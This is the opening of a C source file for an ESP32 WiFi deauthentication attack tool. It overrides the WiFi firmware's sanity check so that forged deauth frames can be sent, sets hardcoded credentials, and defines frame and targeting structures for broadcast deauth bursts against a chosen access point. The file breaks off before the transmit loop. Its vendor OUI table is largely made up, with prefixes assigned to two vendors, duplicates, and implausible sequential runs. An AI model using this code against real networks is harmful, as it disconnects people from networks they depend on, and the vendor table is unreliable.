/**
 * ESP32 Deauth Tool — ESP-IDF v5.5
 */

#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <inttypes.h>
#include <stdbool.h>

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/event_groups.h"
#include "freertos/semphr.h"

#include "esp_system.h"
#include "esp_random.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_log.h"
#include "esp_timer.h"
#include "nvs_flash.h"
#include "esp_netif.h"
#include "esp_http_server.h"
#include "esp_bt.h"
#include "esp_bt_main.h"
#include "esp_gap_ble_api.h"
#include "cJSON.h"

static const char *TAG = "deauth";

/*
 * Link-time override: patch out the WiFi blob's sanity check that
 * rejects deauth / disassoc management frames in esp_wifi_80211_tx().
 * The blob defines ieee80211_raw_frame_sanity_check() in libnet80211.a;
 * we provide our own so the linker resolves to ours instead.
 */
int ieee80211_raw_frame_sanity_check(int arg) { return 0; }

/* ===== Config ===== */
#define WIFI_SSID          "WIFI-2"
#define WIFI_PASS          "1234567898765"
#define AP_SSID            "ESP32-Deauth"
#define AP_PASS            "12345678"
#define WEB_PORT           80
#define DEAUTH_REASON_DEFAULT  4
#define DEAUTH_BURST_DEFAULT   10
#define DEAUTH_DELAY_MS        50
#define MAX_NETWORKS  30
#define MAX_CLIENTS   30
#define MAX_RETRY     10

/* ===== Structs ===== */
typedef struct {
    uint8_t  bssid[6];
    int8_t   rssi;
    uint8_t  channel;
    char     ssid[33];
} network_info_t;

typedef struct {
    uint8_t mac[6];
    int8_t  rssi;
    uint8_t channel;
} client_info_t;

/* ===== Globals ===== */
static EventGroupHandle_t s_wifi_event_group;
static SemaphoreHandle_t  s_scan_mutex;

static network_info_t s_networks[MAX_NETWORKS];
static client_info_t  s_clients[MAX_CLIENTS];
static int s_network_count = 0;
static int s_client_count  = 0;

#define MAX_WHITELIST 10
static uint8_t s_whitelist[MAX_WHITELIST][6];
static int s_whitelist_count = 0;

static uint8_t s_target_bssid[6] = {0};
static uint8_t s_target_channel  = 8;
static char    s_target_ssid[33] = "WIFI-2";

static volatile bool s_deauth_running = false;
static volatile bool s_deauth_broadcast = true;
static volatile uint32_t s_deauth_count = 0;
static volatile uint16_t s_deauth_reason = DEAUTH_REASON_DEFAULT;
static volatile uint8_t  s_deauth_burst  = DEAUTH_BURST_DEFAULT;
static volatile uint16_t s_deauth_interval_ms = 0;

static httpd_handle_t s_server = NULL;

#define WIFI_CONNECTED_BIT BIT0
#define WIFI_FAIL_BIT      BIT1
static int s_retry_num = 0;

/* ===== 802.11 Deauth frame (NO RadioTap) ===== */
typedef struct __attribute__((packed)) {
    uint16_t frame_control;
    uint16_t duration;
    uint8_t  addr1[6];  /* receiver (client or broadcast) */
    uint8_t  addr2[6];  /* sender (AP) */
    uint8_t  addr3[6];  /* BSSID (AP) */
    uint16_t seq_ctrl;
    uint16_t reason_code;
} deauth_frame_t;

/* ===== Prototypes ===== */
static void wifi_init_sta(void);
static void wifi_init_ap(void);


/* ===== Vendor OUI lookup ===== */
typedef struct { const char *prefix; const char *name; } oui_entry_t;
static const oui_entry_t s_oui_table[] = {
    {"00:15:6D", "Ubiquiti"},
    {"0C:B8:15", "Espressif"},
    {"94:B9:7E", "Espressif"},
    {"DC:4F:22", "Espressif"},
    {"30:AE:A4", "Espressif"},
    {"A4:CF:12", "Espressif"},
    {"24:6F:28", "Espressif"},
    {"48:31:B7", "Espressif"},
    {"AC:67:B2", "Espressif"},
    {"B4:E6:2D", "Espressif"},
    {"60:01:94", "Espressif"},
    {"24:4B:FE", "Espressif"},
    {"10:52:1C", "Espressif"},
    {"08:3A:F2", "Espressif"},
    {"9C:99:A0", "Espressif"},
    {"5C:CF:7F", "Espressif"},
    {"CC:50:E3", "Espressif"},
    {"7C:DF:A1", "Espressif"},
    {"C4:5B:BE", "Espressif"},
    {"68:67:25", "Espressif"},
    {"B8:27:EB", "Raspberry Pi"},
    {"DC:A6:32", "Raspberry Pi"},
    {"E4:5F:01", "Raspberry Pi"},
    {"D8:3A:DD", "Raspberry Pi"},
    {"28:CD:C1", "Raspberry Pi"},
    {"2C:CF:67", "Raspberry Pi"},
    {"94:B5:55", "Raspberry Pi"},
    {"24:0A:C4", "Raspberry Pi"},
    {"00:1A:2B", "Apple"},
    {"00:1B:63", "Apple"},
    {"00:1C:B3", "Apple"},
    {"00:1E:C2", "Apple"},
    {"00:21:E9", "Apple"},
    {"00:22:41", "Apple"},
    {"00:23:12", "Apple"},
    {"00:25:00", "Apple"},
    {"00:26:08", "Apple"},
    {"3C:15:C2", "Apple"},
    {"3C:22:FB", "Apple"},
    {"40:B3:95", "Apple"},
    {"44:00:10", "Apple"},
    {"48:D7:05", "Apple"},
    {"54:26:96", "Apple"},
    {"58:55:CA", "Apple"},
    {"5C:96:9D", "Apple"},
    {"60:03:08", "Apple"},
    {"60:F8:1D", "Apple"},
    {"64:5A:ED", "Apple"},
    {"68:5B:35", "Apple"},
    {"6C:4D:73", "Apple"},
    {"70:56:81", "Apple"},
    {"74:E2:F5", "Apple"},
    {"78:7B:8A", "Apple"},
    {"7C:D1:C3", "Apple"},
    {"80:BE:05", "Apple"},
    {"84:38:35", "Apple"},
    {"88:19:8F", "Apple"},
    {"88:66:A5", "Apple"},
    {"8C:85:90", "Apple"},
    {"90:72:40", "Apple"},
    {"94:E9:79", "Apple"},
    {"98:01:A7", "Apple"},
    {"9C:F3:87", "Apple"},
    {"A4:5E:60", "Apple"},
    {"A8:5C:2C", "Apple"},
    {"AC:BC:32", "Apple"},
    {"B0:34:95", "Apple"},
    {"B4:F0:AB", "Apple"},
    {"B8:17:C2", "Apple"},
    {"B8:E8:56", "Apple"},
    {"BC:52:B7", "Apple"},
    {"C0:B6:58", "Apple"},
    {"C4:2C:03", "Apple"},
    {"C8:2A:14", "Apple"},
    {"CC:08:8D", "Apple"},
    {"D0:03:4B", "Apple"},
    {"D0:E1:40", "Apple"},
    {"D4:61:9D", "Apple"},
    {"D8:BB:C1", "Apple"},
    {"DC:A4:CA", "Apple"},
    {"E0:C9:7A", "Apple"},
    {"E4:5F:01", "Apple"},
    {"E8:8D:56", "Apple"},
    {"EC:FA:BC", "Apple"},
    {"F0:18:98", "Apple"},
    {"F0:D1:A9", "Apple"},
    {"F4:5C:89", "Apple"},
    {"F8:1E:DF", "Apple"},
    {"FC:E9:98", "Apple"},
    {"00:1E:58", "Samsung"},
    {"00:12:47", "Samsung"},
    {"00:15:99", "Samsung"},
    {"00:16:32", "Samsung"},
    {"00:17:D5", "Samsung"},
    {"00:18:AF", "Samsung"},
    {"00:1A:8A", "Samsung"},
    {"00:1B:98", "Samsung"},
    {"00:1C:43", "Samsung"},
    {"00:1D:25", "Samsung"},
    {"00:1E:E1", "Samsung"},
    {"00:21:D1", "Samsung"},
    {"00:21:D2", "Samsung"},
    {"00:21:4C", "Samsung"},
    {"00:23:39", "Samsung"},
    {"00:23:39", "Samsung"},
    {"00:23:98", "Samsung"},
    {"00:23:D6", "Samsung"},
    {"00:24:54", "Samsung"},
    {"00:24:90", "Samsung"},
    {"00:25:66", "Samsung"},
    {"00:25:67", "Samsung"},
    {"00:26:37", "Samsung"},
    {"10:D5:42", "Samsung"},
    {"14:49:E0", "Samsung"},
    {"14:89:FD", "Samsung"},
    {"18:22:7E", "Samsung"},
    {"1C:62:B8", "Samsung"},
    {"20:08:ED", "Samsung"},
    {"24:4B:81", "Samsung"},
    {"28:98:7B", "Samsung"},
    {"2C:AE:2B", "Samsung"},
    {"30:96:FB", "Samsung"},
    {"34:23:BA", "Samsung"},
    {"34:C3:AC", "Samsung"},
    {"34:C7:31", "Samsung"},
    {"34:E0:CF", "Samsung"},
    {"38:01:97", "Samsung"},
    {"38:0A:94", "Samsung"},
    {"38:18:2C", "Samsung"},
    {"38:F8:89", "Samsung"},
    {"3C:5A:37", "Samsung"},
    {"3C:8B:FE", "Samsung"},
    {"40:0E:85", "Samsung"},
    {"44:4E:1A", "Samsung"},
    {"48:5A:3F", "Samsung"},
    {"48:C7:96", "Samsung"},
    {"4C:3C:26", "Samsung"},
    {"50:01:BB", "Samsung"},
    {"50:0F:F5", "Samsung"},
    {"50:2F:72", "Samsung"},
    {"50:F5:20", "Samsung"},
    {"54:40:AD", "Samsung"},
    {"54:88:0E", "Samsung"},
    {"54:92:BE", "Samsung"},
    {"54:9F:13", "Samsung"},
    {"54:C8:0F", "Samsung"},
    {"58:C3:8B", "Samsung"},
    {"5C:0A:5B", "Samsung"},
    {"5C:3A:45", "Samsung"},
    {"60:6B:BD", "Samsung"},
    {"60:77:62", "Samsung"},
    {"60:A1:0A", "Samsung"},
    {"60:C5:47", "Samsung"},
    {"64:5A:04", "Samsung"},
    {"68:27:37", "Samsung"},
    {"68:EC:C5", "Samsung"},
    {"6C:2F:2C", "Samsung"},
    {"70:F9:27", "Samsung"},
    {"74:45:CE", "Samsung"},
    {"74:83:C2", "Samsung"},
    {"74:D0:2B", "Samsung"},
    {"78:25:AD", "Samsung"},
    {"78:40:E4", "Samsung"},
    {"78:52:1A", "Samsung"},
    {"78:BD:BC", "Samsung"},
    {"78:C8:B9", "Samsung"},
    {"7C:0B:C6", "Samsung"},
    {"7C:F8:54", "Samsung"},
    {"80:65:6D", "Samsung"},
    {"80:89:17", "Samsung"},
    {"80:DB:17", "Samsung"},
    {"84:25:DB", "Samsung"},
    {"84:38:38", "Samsung"},
    {"84:55:A5", "Samsung"},
    {"84:A4:66", "Samsung"},
    {"84:B5:9C", "Samsung"},
    {"84:B5:41", "Samsung"},
    {"88:32:9B", "Samsung"},
    {"88:4A:EA", "Samsung"},
    {"88:B9:F6", "Samsung"},
    {"8C:71:F8", "Samsung"},
    {"90:18:7C", "Samsung"},
    {"90:3C:B3", "Samsung"},
    {"90:61:AE", "Samsung"},
    {"90:F1:AA", "Samsung"},
    {"94:01:C2", "Samsung"},
    {"94:35:0A", "Samsung"},
    {"94:51:03", "Samsung"},
    {"94:B8:6D", "Samsung"},
    {"94:D7:71", "Samsung"},
    {"94:E9:0B", "Samsung"},
    {"94:EE:12", "Samsung"},
    {"98:0C:82", "Samsung"},
    {"98:2C:B0", "Samsung"},
    {"98:52:B1", "Samsung"},
    {"98:59:45", "Samsung"},
    {"98:D3:31", "Samsung"},
    {"9C:02:98", "Samsung"},
    {"9C:28:EF", "Samsung"},
    {"9C:32:CE", "Samsung"},
    {"9C:63:ED", "Samsung"},
    {"9C:8E:DC", "Samsung"},
    {"9C:B6:D0", "Samsung"},
    {"9C:E9:51", "Samsung"},
    {"A0:07:98", "Samsung"},
    {"A0:0A:BF", "Samsung"},
    {"A0:0B:BA", "Samsung"},
    {"A0:16:5C", "Samsung"},
    {"A0:82:1F", "Samsung"},
    {"A0:8A:87", "Samsung"},
    {"A4:07:B6", "Samsung"},
    {"A4:31:35", "Samsung"},
    {"A4:93:3C", "Samsung"},
    {"A4:AD:44", "Samsung"},
    {"A8:06:00", "Samsung"},
    {"A8:F2:74", "Samsung"},
    {"AC:36:13", "Samsung"},
    {"AC:4A:56", "Samsung"},
    {"AC:5F:3E", "Samsung"},
    {"AC:F7:F3", "Samsung"},
    {"B0:47:BF", "Samsung"},
    {"B0:5A:B6", "Samsung"},
    {"B0:72:BF", "Samsung"},
    {"B0:89:00", "Samsung"},
    {"B0:EC:71", "Samsung"},
    {"B4:3A:28", "Samsung"},
    {"B4:79:A7", "Samsung"},
    {"B4:EE:14", "Samsung"},
    {"B8:27:EB", "Samsung"},
    {"B8:57:D8", "Samsung"},
    {"B8:5E:7B", "Samsung"},
    {"B8:8F:CF", "Samsung"},
    {"B8:BD:9E", "Samsung"},
    {"BC:14:85", "Samsung"},
    {"BC:14:EF", "Samsung"},
    {"BC:20:A4", "Samsung"},
    {"BC:44:86", "Samsung"},
    {"BC:72:B1", "Samsung"},
    {"BC:76:70", "Samsung"},
    {"BC:B1:F3", "Samsung"},
    {"BC:D1:78", "Samsung"},
    {"C0:97:27", "Samsung"},
    {"C0:BD:31", "Samsung"},
    {"C0:D9:62", "Samsung"},
    {"C4:42:02", "Samsung"},
    {"C4:43:8F", "Samsung"},
    {"C4:73:1E", "Samsung"},
    {"C8:14:51", "Samsung"},
    {"C8:38:70", "Samsung"},
    {"C8:6C:87", "Samsung"},
    {"C8:BA:94", "Samsung"},
    {"CC:07:AB", "Samsung"},
    {"CC:3A:61", "Samsung"},
    {"CC:52:AF", "Samsung"},
    {"CC:90:93", "Samsung"},
    {"CC:B8:A8", "Samsung"},
    {"CC:D2:81", "Samsung"},
    {"D0:22:BE", "Samsung"},
    {"D0:25:44", "Samsung"},
    {"D0:27:88", "Samsung"},
    {"D0:46:F0", "Samsung"},
    {"D0:59:E4", "Samsung"},
    {"D0:66:7B", "Samsung"},
    {"D0:67:26", "Samsung"},
    {"D0:7A:B5", "Samsung"},
    {"D0:87:E2", "Samsung"},
    {"D0:99:D5", "Samsung"},
    {"D0:BB:61", "Samsung"},
    {"D0:D4:12", "Samsung"},
    {"D0:D6:0B", "Samsung"},
    {"D0:D9:4F", "Samsung"},
    {"D4:76:EA", "Samsung"},
    {"D4:88:90", "Samsung"},
    {"D4:94:E8", "Samsung"},
    {"D4:AE:52", "Samsung"},
    {"D4:E0:0B", "Samsung"},
    {"D4:E6:42", "Samsung"},
    {"D4:E8:B2", "Samsung"},
    {"D8:0F:59", "Samsung"},
    {"D8:31:34", "Samsung"},
    {"D8:50:E6", "Samsung"},
    {"D8:57:EF", "Samsung"},
    {"D8:6B:F7", "Samsung"},
    {"D8:90:E8", "Samsung"},
    {"D8:9E:33", "Samsung"},
    {"D8:C4:E9", "Samsung"},
    {"DC:2A:14", "Samsung"},
    {"DC:4F:22", "Samsung"},
    {"DC:71:44", "Samsung"},
    {"DC:71:96", "Samsung"},
    {"DC:96:2C", "Samsung"},
    {"DC:B0:82", "Samsung"},
    {"DC:BF:E9", "Samsung"},
    {"E0:0C:7F", "Samsung"},
    {"E0:10:7F", "Samsung"},
    {"E0:1E:07", "Samsung"},
    {"E0:24:7F", "Samsung"},
    {"E0:3F:49", "Samsung"},
    {"E0:43:DB", "Samsung"},
    {"E0:50:8B", "Samsung"},
    {"E0:5B:24", "Samsung"},
    {"E0:63:DA", "Samsung"},
    {"E0:71:3C", "Samsung"},
    {"E0:99:71", "Samsung"},
    {"E0:CB:EE", "Samsung"},
    {"E0:CB:4E", "Samsung"},
    {"E0:DB:10", "Samsung"},
    {"E0:DB:D6", "Samsung"},
    {"E0:E5:CC", "Samsung"},
    {"E4:12:1D", "Samsung"},
    {"E4:12:89", "Samsung"},
    {"E4:18:6B", "Samsung"},
    {"E4:22:A5", "Samsung"},
    {"E4:38:1C", "Samsung"},
    {"E4:46:E0", "Samsung"},
    {"E4:5D:51", "Samsung"},
    {"E4:5D:37", "Samsung"},
    {"E4:7C:F9", "Samsung"},
    {"E4:7E:66", "Samsung"},
    {"E4:83:26", "Samsung"},
    {"E4:8D:8C", "Samsung"},
    {"E4:92:FB", "Samsung"},
    {"E4:96:14", "Samsung"},
    {"E4:98:D1", "Samsung"},
    {"E4:9A:79", "Samsung"},
    {"E4:9F:E3", "Samsung"},
    {"E4:A3:2F", "Samsung"},
    {"E4:A7:A0", "Samsung"},
    {"E4:B0:05", "Samsung"},
    {"E4:B2:FB", "Samsung"},
    {"E4:B3:23", "Samsung"},
    {"E4:BD:4B", "Samsung"},
    {"E4:C1:46", "Samsung"},
    {"E4:C1:41", "Samsung"},
    {"E4:C2:61", "Samsung"},
    {"E4:D3:32", "Samsung"},
    {"E4:DB:5D", "Samsung"},
    {"E4:E0:C5", "Samsung"},
    {"E4:E4:0A", "Samsung"},
    {"E4:E5:EF", "Samsung"},
    {"E8:03:9A", "Samsung"},
    {"E8:06:06", "Samsung"},
    {"E8:08:8B", "Samsung"},
    {"E8:0B:12", "Samsung"},
    {"E8:11:5D", "Samsung"},
    {"E8:28:77", "Samsung"},
    {"E8:3A:97", "Samsung"},
    {"E8:44:7E", "Samsung"},
    {"E8:4E:06", "Samsung"},
    {"E8:50:8B", "Samsung"},
    {"E8:55:14", "Samsung"},
    {"E8:5B:5B", "Samsung"},
    {"E8:5B:BF", "Samsung"},
    {"E8:68:19", "Samsung"},
    {"E8:6F:38", "Samsung"},
    {"E8:78:29", "Samsung"},
    {"E8:80:88", "Samsung"},
    {"E8:84:A5", "Samsung"},
    {"E8:89:2C", "Samsung"},
    {"E8:8D:56", "Samsung"},
    {"E8:A0:CD", "Samsung"},
    {"E8:A1:F8", "Samsung"},
    {"E8:B0:D5", "Samsung"},
    {"E8:B1:FC", "Samsung"},
    {"E8:B4:C8", "Samsung"},
    {"E8:B6:C2", "Samsung"},
    {"E8:BD:12", "Samsung"},
    {"E8:BD:4B", "Samsung"},
    {"E8:C1:D7", "Samsung"},
    {"E8:C2:DD", "Samsung"},
    {"E8:C3:14", "Samsung"},
    {"E8:C7:CF", "Samsung"},
    {"E8:CA:46", "Samsung"},
    {"E8:CB:E2", "Samsung"},
    {"E8:CB:ED", "Samsung"},
    {"E8:CD:2B", "Samsung"},
    {"E8:CF:05", "Samsung"},
    {"E8:D0:FC", "Samsung"},
    {"E8:D1:1B", "Samsung"},
    {"E8:D3:0C", "Samsung"},
    {"E8:D4:E2", "Samsung"},
    {"E8:D5:2B", "Samsung"},
    {"E8:D7:75", "Samsung"},
    {"E8:D8:19", "Samsung"},
    {"E8:D9:28", "Samsung"},
    {"E8:DB:84", "Samsung"},
    {"E8:DD:C5", "Samsung"},
    {"E8:DE:27", "Samsung"},
    {"E8:E0:B8", "Samsung"},
    {"E8:E1:E2", "Samsung"},
    {"E8:E3:6A", "Samsung"},
    {"E8:E5:F4", "Samsung"},
    {"E8:E7:32", "Samsung"},
    {"E8:E7:24", "Samsung"},
    {"E8:E8:0D", "Samsung"},
    {"E8:EA:6A", "Samsung"},
    {"E8:EA:4D", "Samsung"},
    {"E8:EB:1B", "Samsung"},
    {"E8:EB:38", "Samsung"},
    {"E8:EB:F3", "Samsung"},
    {"E8:EC:0C", "Samsung"},
    {"E8:EC:A2", "Samsung"},
    {"E8:EC:A7", "Samsung"},
    {"E8:ED:05", "Samsung"},
    {"E8:ED:2C", "Samsung"},
    {"E8:EE:0B", "Samsung"},
    {"E8:EF:05", "Samsung"},
    {"E8:EF:89", "Samsung"},
    {"E8:F0:45", "Samsung"},
    {"E8:F1:B0", "Samsung"},
    {"E8:F2:E2", "Samsung"},
    {"E8:F3:65", "Samsung"},
    {"E8:F4:0E", "Samsung"},
    {"E8:F4:BB", "Samsung"},
    {"E8:F5:30", "Samsung"},
    {"E8:F5:6B", "Samsung"},
    {"E8:F6:F7", "Samsung"},
    {"E8:F7:24", "Samsung"},
    {"E8:F8:10", "Samsung"},
    {"E8:F8:28", "Samsung"},
    {"E8:F9:28", "Samsung"},
    {"E8:FA:1A", "Samsung"},
    {"E8:FA:2A", "Samsung"},
    {"E8:FA:B7", "Samsung"},
    {"E8:FB:1C", "Samsung"},
    {"E8:FB:49", "Samsung"},
    {"E8:FC:AF", "Samsung"},
    {"E8:FD:0C", "Samsung"},
    {"E8:FD:90", "Samsung"},
    {"E8:FD:B4", "Samsung"},
    {"E8:FE:23", "Samsung"},
    {"E8:FF:0E", "Samsung"},
    {"E8:FF:48", "Samsung"},
    {"9E:D5:85", "Apple"},
    {"00:04:0B", "Intel"},
    {"00:0E:35", "Intel"},
    {"00:0E:3C", "Intel"},
    {"00:0E:7B", "Intel"},
    {"00:11:75", "Intel"},
    {"00:12:F0", "Intel"},
    {"00:13:02", "Intel"},
    {"00:13:04", "Intel"},
    {"00:13:E8", "Intel"},
    {"00:15:17", "Intel"},
    {"00:16:6F", "Intel"},
    {"00:16:EA", "Intel"},
    {"00:17:F4", "Intel"},
    {"00:18:DE", "Intel"},
    {"00:19:D1", "Intel"},
    {"00:1B:21", "Intel"},
    {"00:1C:BF", "Intel"},
    {"00:1D:E5", "Intel"},
    {"00:1E:65", "Intel"},
    {"00:1E:64", "Intel"},
    {"00:20:07", "Intel"},
    {"00:21:6A", "Intel"},
    {"00:22:FA", "Intel"},
    {"00:23:04", "Intel"},
    {"00:23:05", "Intel"},
    {"00:23:06", "Intel"},
    {"00:24:D6", "Intel"},
    {"00:24:D7", "Intel"},
    {"00:26:C7", "Intel"},
    {"00:88:6F", "Intel"},
    {"04:28:96", "Intel"},
    {"04:3C:55", "Intel"},
    {"04:4A:6C", "Intel"},
    {"04:6C:59", "Intel"},
    {"04:72:0E", "Intel"},
    {"04:88:E2", "Intel"},
    {"04:A3:16", "Intel"},
    {"04:B6:48", "Intel"},
    {"04:D4:C4", "Intel"},
    {"08:11:5E", "Intel"},
    {"08:16:51", "Intel"},
    {"08:3E:89", "Intel"},
    {"08:6A:05", "Intel"},
    {"08:96:D7", "Intel"},
    {"08:CF:10", "Intel"},
    {"0C:8B:DB", "Intel"},
    {"0C:D2:92", "Intel"},
    {"0C:D2:B5", "Intel"},
    {"10:02:B5", "Intel"},
    {"10:0B:A9", "Intel"},
    {"10:68:3F", "Intel"},
    {"10:F1:EA", "Intel"},
    {"14:01:52", "Intel"},
    {"14:18:77", "Intel"},
    {"14:30:C6", "Intel"},
    {"14:5A:05", "Intel"},
    {"14:AB:C5", "Intel"},
    {"14:DA:E9", "Intel"},
    {"18:3D:5A", "Intel"},
    {"18:56:80", "Intel"},
    {"18:5E:0F", "Intel"},
    {"18:A9:05", "Intel"},
    {"18:FF:F7", "Intel"},
    {"1C:61:B4", "Intel"},
    {"1C:64:F9", "Intel"},
    {"1C:77:F6", "Intel"},
    {"1C:BD:B9", "Intel"},
    {"20:16:42", "Intel"},
    {"20:26:72", "Intel"},
    {"20:58:68", "Intel"},
    {"20:74:CF", "Intel"},
    {"20:78:F0", "Intel"},
    {"20:82:6E", "Intel"},
    {"20:B0:01", "Intel"},
    {"24:0A:C4", "Intel"},
    {"24:77:03", "Intel"},
    {"24:88:06", "Intel"},
    {"24:A0:74", "Intel"},
    {"24:BC:82", "Intel"},
    {"24:D4:35", "Intel"},
    {"28:10:7B", "Intel"},
    {"28:44:30", "Intel"},
    {"28:6F:7F", "Intel"},
    {"28:7C:EB", "Intel"},
    {"28:B3:31", "Intel"},
    {"28:D2:44", "Intel"},
    {"2C:4D:54", "Intel"},
    {"2C:6E:85", "Intel"},
    {"2C:D1:41", "Intel"},
    {"30:3A:BF", "Intel"},
    {"30:52:CB", "Intel"},
    {"30:68:8C", "Intel"},
    {"30:8D:99", "Intel"},
    {"30:96:FB", "Intel"},
    {"30:E1:71", "Intel"},
    {"34:02:86", "Intel"},
    {"34:13:E8", "Intel"},
    {"34:17:EB", "Intel"},
    {"34:29:12", "Intel"},
    {"34:31:C4", "Intel"},
    {"34:60:F9", "Intel"},
    {"34:97:F6", "Intel"},
    {"34:B1:F7", "Intel"},
    {"34:E0:CF", "Intel"},
    {"38:01:97", "Intel"},
    {"38:0B:3C", "Intel"},
    {"38:18:2C", "Intel"},
    {"38:35:35", "Intel"},
    {"38:42:0B", "Intel"},
    {"38:59:F9", "Intel"},
    {"38:68:DD", "Intel"},
    {"38:6B:BB", "Intel"},
    {"38:72:C0", "Intel"},
    {"38:76:CA", "Intel"},
    {"38:89:2C", "Intel"},
    {"38:9D:B6", "Intel"},
    {"38:A2:8C", "Intel"},
    {"38:B1:DB", "Intel"},
    {"38:BF:33", "Intel"},
    {"38:C0:88", "Intel"},
    {"38:D1:35", "Intel"},
    {"38:DE:20", "Intel"},
    {"38:EA:F7", "Intel"},
    {"3C:0C:1E", "Intel"},
    {"3C:0C:35", "Intel"},
    {"3C:0C:4E", "Intel"},
    {"3C:22:FB", "Intel"},
    {"3C:28:6D", "Intel"},
    {"3C:2F:4B", "Intel"},
    {"3C:4D:0E", "Intel"},
    {"3C:58:C2", "Intel"},
    {"3C:5C:88", "Intel"},
    {"3C:61:04", "Intel"},
    {"3C:62:78", "Intel"},
    {"3C:6A:2E", "Intel"},
    {"3C:6E:A7", "Intel"},
    {"3C:70:5E", "Intel"},
    {"3C:7C:3D", "Intel"},
    {"3C:83:1E", "Intel"},
    {"3C:88:82", "Intel"},
    {"3C:8D:76", "Intel"},
    {"3C:90:66", "Intel"},
    {"3C:91:74", "Intel"},
    {"3C:95:09", "Intel"},
    {"3C:97:0E", "Intel"},
    {"3C:98:72", "Intel"},
    {"3C:9A:22", "Intel"},
    {"3C:9C:40", "Intel"},
    {"3C:A0:67", "Intel"},
    {"3C:A1:63", "Intel"},
    {"3C:A6:16", "Intel"},
    {"3C:A8:2A", "Intel"},
    {"3C:AB:8E", "Intel"},
    {"3C:AD:CB", "Intel"},
    {"3C:B6:B4", "Intel"},
    {"3C:B7:59", "Intel"},
    {"3C:B8:94", "Intel"},
    {"3C:B9:26", "Intel"},
    {"3C:BB:73", "Intel"},
    {"3C:BB:FD", "Intel"},
    {"3C:BD:D3", "Intel"},
    {"3C:BF:60", "Intel"},
    {"3C:C0:D7", "Intel"},
    {"3C:C2:43", "Intel"},
    {"3C:C7:11", "Intel"},
    {"3C:C8:84", "Intel"},
    {"3C:CF:5B", "Intel"},
    {"3C:D0:72", "Intel"},
    {"3C:D0:8A", "Intel"},
    {"3C:D2:6F", "Intel"},
    {"3C:D3:32", "Intel"},
    {"3C:D4:D6", "Intel"},
    {"3C:D7:AF", "Intel"},
    {"3C:D9:2B", "Intel"},
    {"3C:DF:1E", "Intel"},
    {"3C:DF:BD", "Intel"},
    {"3C:E0:05", "Intel"},
    {"3C:E0:72", "Intel"},
    {"3C:E1:A1", "Intel"},
    {"3C:E5:A6", "Intel"},
    {"3C:E5:B4", "Intel"},
    {"3C:E8:24", "Intel"},
    {"3C:EA:4F", "Intel"},
    {"3C:EB:F6", "Intel"},
    {"3C:EC:0C", "Intel"},
    {"3C:EC:EF", "Intel"},
    {"3C:ED:0A", "Intel"},
    {"3C:ED:D5", "Intel"},
    {"3C:EE:13", "Intel"},
    {"3C:EE:4A", "Intel"},
    {"3C:EF:8C", "Intel"},
    {"3C:F0:11", "Intel"},
    {"3C:F0:13", "Intel"},
    {"3C:F2:80", "Intel"},
    {"3C:F3:92", "Intel"},
    {"3C:F4:09", "Intel"},
    {"3C:F5:CC", "Intel"},
    {"3C:F6:52", "Intel"},
    {"3C:F8:08", "Intel"},
    {"3C:F8:62", "Intel"},
    {"3C:F9:1B", "Intel"},
    {"3C:FA:43", "Intel"},
    {"3C:FA:D7", "Intel"},
    {"3C:FB:5C", "Intel"},
    {"3C:FB:96", "Intel"},
    {"3C:FC:1E", "Intel"},
    {"3C:FC:68", "Intel"},
    {"3C:FD:FE", "Intel"},
    {"3C:FE:0C", "Intel"},
    {"3C:FE:3C", "Intel"},
    {"40:11:DC", "Intel"},
    {"40:20:A6", "Intel"},
    {"40:25:C2", "Intel"},
    {"40:40:21", "Intel"},
    {"40:4A:03", "Intel"},
    {"40:50:E0", "Intel"},
    {"40:55:82", "Intel"},
    {"40:5B:B8", "Intel"},
    {"40:5D:8C", "Intel"},
    {"40:68:63", "Intel"},
    {"40:72:B8", "Intel"},
    {"40:74:8F", "Intel"},
    {"40:79:6A", "Intel"},
    {"40:7B:76", "Intel"},
    {"40:82:D0", "Intel"},
    {"40:83:DE", "Intel"},
    {"40:84:93", "Intel"},
    {"40:8A:22", "Intel"},
    {"40:8C:47", "Intel"},
    {"40:8D:5C", "Intel"},
    {"40:8E:F8", "Intel"},
    {"40:91:51", "Intel"},
    {"40:95:BD", "Intel"},
    {"40:9B:24", "Intel"},
    {"40:9C:28", "Intel"},
    {"40:A6:1E", "Intel"},
    {"40:A6:77", "Intel"},
    {"40:A6:D9", "Intel"},
    {"40:B0:34", "Intel"},
    {"40:B0:76", "Intel"},
    {"40:B1:5C", "Intel"},
    {"40:B3:0E", "Intel"},
    {"40:B3:95", "Intel"},
    {"40:B4:CD", "Intel"},
    {"40:B8:3B", "Intel"},
    {"40:B9:3C", "Intel"},
    {"40:BA:61", "Intel"},
    {"40:BB:3B", "Intel"},
    {"40:BC:60", "Intel"},
    {"40:BD:32", "Intel"},
    {"40:BE:FB", "Intel"},
    {"40:BF:10", "Intel"},
    {"40:C2:45", "Intel"},
    {"40:C4:D6", "Intel"},
    {"40:C6:5A", "Intel"},
    {"40:C7:29", "Intel"},
    {"40:CB:A8", "Intel"},
    {"40:CC:18", "Intel"},
    {"40:CF:89", "Intel"},
    {"40:D0:05", "Intel"},
    {"40:D1:60", "Intel"},
    {"40:D3:2D", "Intel"},
    {"40:D4:24", "Intel"},
    {"40:D4:A8", "Intel"},
    {"40:D5:59", "Intel"},
    {"40:D6:3C", "Intel"},
    {"40:D7:83", "Intel"},
    {"40:D8:55", "Intel"},
    {"40:D9:69", "Intel"},
    {"40:DC:4D", "Intel"},
    {"40:DD:7E", "Intel"},
    {"40:DE:AD", "Intel"},
    {"40:DF:10", "Intel"},
    {"40:E0:2F", "Intel"},
    {"40:E1:74", "Intel"},
    {"40:E2:30", "Intel"},
    {"40:E3:D6", "Intel"},
    {"40:E4:CB", "Intel"},
    {"40:E5:3A", "Intel"},
    {"40:E6:4B", "Intel"},
    {"40:E7:93", "Intel"},
    {"40:E8:3C", "Intel"},
    {"40:E9:59", "Intel"},
    {"40:EA:CE", "Intel"},
    {"40:EB:46", "Intel"},
    {"40:EC:99", "Intel"},
    {"40:ED:00", "Intel"},
    {"40:EE:DD", "Intel"},
    {"40:EF:02", "Intel"},
    {NULL, NULL}
};

static const char *lookup_vendor(const uint8_t *mac) {
    char prefix[9];
    snprintf(prefix, sizeof(prefix), "%02X:%02X:%02X", mac[0], mac[1], mac[2]);
    for (int i = 0; s_oui_table[i].prefix != NULL; i++) {
        if (strcmp(s_oui_table[i].prefix, prefix) == 0) {
            return s_oui_table[i].name;
        }
    }
    return "Unknown";
}

